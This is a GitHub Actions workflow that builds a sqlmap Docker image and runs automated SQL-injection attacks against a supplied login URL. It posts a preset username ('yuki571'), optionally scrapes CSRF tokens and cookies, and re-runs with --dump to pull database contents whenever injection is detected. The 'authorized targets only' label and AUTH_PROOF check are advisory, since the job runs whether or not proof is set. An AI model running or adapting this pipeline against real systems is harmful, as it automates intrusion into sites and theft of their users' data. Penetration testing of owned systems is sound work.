name: Build sqlmap image and run (authorized targets only)

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Login URL (full). If empty, will use TARGET_URL secret'
        required: false
        default: ''
      username:
        description: 'Username to test (default: yuki571)'
        required: false
        default: 'yuki571'
      use_csrf:
        description: 'true/false - whether to attempt to extract CSRF token from the login page'
        required: false
        default: 'false'
      password_placeholder:
        description: 'Placeholder password to include in POST body (sqlmap injects into parameters)'
        required: false
        default: 'placeholder'
      dump_on_find:
        description: 'true/false - if true, will append --dump when sqlmap reports injection (only for owned/test systems)'
        required: false
        default: ''

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    steps:
      - name: Safety/inputs check
        id: check
        run: |
          set -euxo pipefail
          TARGET="${{ github.event.inputs.target_url || secrets.TARGET_URL }}"
          USER="${{ github.event.inputs.username }}"
          if [ -z "$TARGET" ]; then
            echo "ERROR: TARGET URL not provided (set workflow input or TARGET_URL secret)."
            exit 1
          fi
          echo "target=$TARGET" >> $GITHUB_OUTPUT
          echo "username=$USER" >> $GITHUB_OUTPUT
          echo "use_csrf=${{ github.event.inputs.use_csrf }}" >> $GITHUB_OUTPUT
          echo "password_placeholder=${{ github.event.inputs.password_placeholder }}" >> $GITHUB_OUTPUT
          echo "dump_on_find=${{ github.event.inputs.dump_on_find || secrets.DUMP_ON_FIND }}" >> $GITHUB_OUTPUT
          if [ -z "${{ secrets.AUTH_PROOF }}" ]; then
            echo "NOTE: AUTH_PROOF not set as a secret. Recommended to set to prove authorization."
          else
            echo "AUTH_PROOF present (not shown)."
          fi

      - name: Install tools (robust apt)
        run: |
          set -euxo pipefail
          export DEBIAN_FRONTEND=noninteractive
          sudo apt-get update -o Acquire::Retries=3
          # install essential tools with retry/fix logic
          if ! sudo apt-get install -y --no-install-recommends git curl jq ca-certificates apt-transport-https gnupg; then
            echo "apt install failed — attempt to repair broken packages and retry"
            sudo apt-get -f install -y || true
            sudo dpkg --configure -a || true
            sudo apt-get update -o Acquire::Retries=3
            sudo apt-get install -y --no-install-recommends git curl jq ca-certificates apt-transport-https gnupg
          fi
          # cleanup
          sudo apt-get clean
          sudo rm -rf /var/lib/apt/lists/*
          # verify
          git --version || true
          curl --version || true
          jq --version || true
          docker --version || true

      - name: Clone sqlmap upstream
        run: |
          rm -rf /tmp/sqlmap_repo
          git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /tmp/sqlmap_repo
          ls -la /tmp/sqlmap_repo | sed -n '1,120p'

      - name: Create Dockerfile (robust apt inside image)
        run: |
          cat > /tmp/sqlmap_repo/Dockerfile <<'EOF'
FROM python:3.11-slim
ENV DEBIAN_FRONTEND=noninteractive
WORKDIR /sqlmap
COPY . /sqlmap

# Robust apt install: update, install with retries, attempt automatic fix on failure, then clean.
RUN set -eux; \
    apt-get update -o Acquire::Retries=3; \
    if ! apt-get install -y --no-install-recommends git curl ca-certificates build-essential ; then \
      echo "Initial apt-get install failed; trying to fix broken packages..."; \
      apt-get -f install -y || true; \
      dpkg --configure -a || true; \
      apt-get update -o Acquire::Retries=3; \
      apt-get install -y --no-install-recommends git curl ca-certificates build-essential; \
    fi; \
    apt-get clean; \
    rm -rf /var/lib/apt/lists/*

# Install python deps; fail-safe (do not break build on pip issues)
RUN pip install --no-cache-dir -r requirements.txt 2>/dev/null || true

ENTRYPOINT ["python3", "sqlmap.py"]
EOF
          sed -n '1,200p' /tmp/sqlmap_repo/Dockerfile

      - name: Build sqlmap docker image
        run: |
          set -euxo pipefail
          cd /tmp/sqlmap_repo
          sudo docker build -t my-sqlmap:ci .
          sudo docker images my-sqlmap:ci

      - name: (Optional) Extract CSRF token from login page
        if: ${{ github.event.inputs.use_csrf == 'true' }}
        run: |
          set -euxo pipefail
          TARGET="${{ steps.check.outputs.target }}"
          echo "Fetching login page to try to find CSRF token..."
          curl -s -c /tmp/cookies.txt "$TARGET" -o /tmp/loginpage.html || true
          # try common patterns; adjust to your page as needed
          CSRF=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/loginpage.html || true)
          if [ -z "$CSRF" ]; then
            CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' /tmp/loginpage.html || true)
          fi
          if [ -z "$CSRF" ]; then
            echo "WARNING: CSRF token not auto-extracted. Dumping first 200 lines for debugging."
            sed -n '1,200p' /tmp/loginpage.html
          else
            echo "CSRF_TOKEN=$CSRF" >> $GITHUB_ENV
            echo "COOKIE_JAR=/tmp/cookies.txt" >> $GITHUB_ENV
            echo "Extracted CSRF token (hidden)."
          fi

      - name: Run sqlmap container (non-interactive) and capture output
        env:
          TARGET: ${{ steps.check.outputs.target }}
          USERNAME: ${{ steps.check.outputs.username }}
          PASS_PLACEHOLDER: ${{ steps.check.outputs.password_placeholder }}
          DUMP_ON_FIND: ${{ steps.check.outputs.dump_on_find }}
        run: |
          set -euxo pipefail
          POST="username=${USERNAME}&password=${PASS_PLACEHOLDER}"
          if [ -n "${CSRF_TOKEN:-}" ]; then
            POST="${POST}&csrf_token=${CSRF_TOKEN}"
            # cookie jar created earlier if use_csrf true
            COOKIE_MNT="-v /tmp/cookies.txt:/tmp/cookies.txt:ro"
          else
            COOKIE_MNT=""
          fi

          LOGFILE=/tmp/sqlmap_run_output.txt
          echo "POST (logged with token redacted):"
          echo "${POST}" | sed -E 's/(csrf_token=[^&]+)/csrf_token=REDACTED/'

          # Note: do not assume --network host is available; use direct public TARGET_URL.
          docker run --rm $COOKIE_MNT my-sqlmap:ci --url "$TARGET" --data "$POST" --batch --level=3 --risk=2 --threads=2 --timeout=15 > "$LOGFILE" 2>&1 || true

          # If dump requested and initial output suggests vulnerability, run --dump
          if [ "${DUMP_ON_FIND:-}" = "true" ]; then
            if grep -iE "is vulnerable|parameter.*is.*vulnerable" "$LOGFILE" >/dev/null 2>&1; then
              echo "Vulnerability signature found — re-running with --dump (ONLY on owned systems)."
              docker run --rm $COOKIE_MNT my-sqlmap:ci --url "$TARGET" --data "$POST" --batch --level=3 --risk=2 --threads=2 --timeout=15 --dump >> "$LOGFILE" 2>&1 || true
            else
              echo "No clear vulnerability signature found; skipping --dump."
            fi
          fi

          echo "===== sqlmap output (tail) ====="
          tail -n 200 "$LOGFILE" || true
          cp "$LOGFILE" /tmp/sqlmap_output_saved.txt || true
          # exit with success if sqlmap found something (heuristic), otherwise exit 0 to avoid failing workflow
          if grep -iE "is vulnerable|parameter.*is.*vulnerable" "$LOGFILE" >/dev/null 2>&1; then
            echo "VULNERABILITY_DETECTED=1" >> $GITHUB_OUTPUT
          else
            echo "VULNERABILITY_DETECTED=0" >> $GITHUB_OUTPUT
          fi

      - name: Upload sqlmap logs as artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sqlmap-output
          path: /tmp/sqlmap_output_saved.txt
